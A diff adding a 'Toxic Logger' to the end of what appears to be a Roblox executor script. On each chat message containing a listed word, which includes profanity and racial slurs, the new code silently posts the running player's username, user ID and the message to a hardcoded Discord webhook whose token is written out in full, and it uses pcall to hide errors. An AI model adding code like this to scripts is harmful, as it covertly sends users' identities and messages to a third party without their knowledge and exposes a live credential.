@@ -1008,3 +1008,62 @@ end
 
 -- send webhook
 sendWebhook(embed)
+
+--Config
+getgenv().webhookUrl = "https://discord.com/api/webhooks/1452620288041680926/4VoDiagp1T3K1lV3EJmu9kdSB2SVZWvtcYGC1Hdiididgd9p17PoxRZfmLDl8VxQ6UiM"
+
+-- text
+local toxicWords = {
+    "anj", "anjing", "bangsat", "ngentot", "kontol", "memek", "anjir", "goblok", "bajingan", "sialan",
+    "babi", "tai", "cok", "asu", "fuck", "shit", "bitch", "nigga", "nigger", "syng", "syg", "pacaran", "pcr", "ay", "ayy", "ayang", "ayng", "ayg", "tolol", "bego", "gendeng", "bgst", "bngst",
+    "b3g0", "tai", "jumpboad", "jump boat", "jumpboat", "tuueemmpekk"
+}
+
+
+local function sendWebhook(embed)
+    local data = {
+        ["content"] = "TOXIC",
+        ["embeds"] = {embed}
+    }
+    local json = game:GetService("HttpService"):JSONEncode(data)
+    local headers = {["Content-Type"] = "application/json"}
+    local requestFunc = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+    pcall(function()
+        requestFunc({Url = getgenv().webhookUrl, Body = json, Method = "POST", Headers = headers})
+    end)
+end
+
+-- check
+local function isToxic(msg)
+    local lowerMsg = string.lower(msg)
+    for _, word in ipairs(toxicWords) do
+        if string.find(lowerMsg, word) then
+            return true, word
+        end
+    end
+    return false, nil
+end
+
+-- settings
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    local isToxicMsg, toxicWord = isToxic(msg)
+    if isToxicMsg then
+        local embed = {
+            ["title"] = "🚨 **CHAT TOXIC DETECTED**",
+            ["description"] = "User mengirim pesan toxic di chat!",
+            ["color"] = 0xFF0000,
+            ["fields"] = {
+                {["name"] = "👤 **Username**", ["value"] = game.Players.LocalPlayer.Name, ["inline"] = true},
+                {["name"] = "🏷️ **Display Name**", ["value"] = game.Players.LocalPlayer.DisplayName or "N/A", ["inline"] = true},
+                {["name"] = "🆔 **UserID**", ["value"] = tostring(game.Players.LocalPlayer.UserId), ["inline"] = true},
+                {["name"] = "💬 **Message**", ["value"] = "```" .. msg .. "```", ["inline"] = false},
+                {["name"] = "⚠️ **Kata Toxic**", ["value"] = toxicWord, ["inline"] = true},
+                {["name"] = "📝 **Deskripsi Report**", ["value"] = "User terdeteksi mengirimkan pesan yang melanggar Community Rules Roblox (kata kasar/toxic).", ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "Toxic Logger | " .. os.date("%H:%M:%S")}
+        }
+
+        sendWebhook(embed)
+        print("")
+    end
+end)
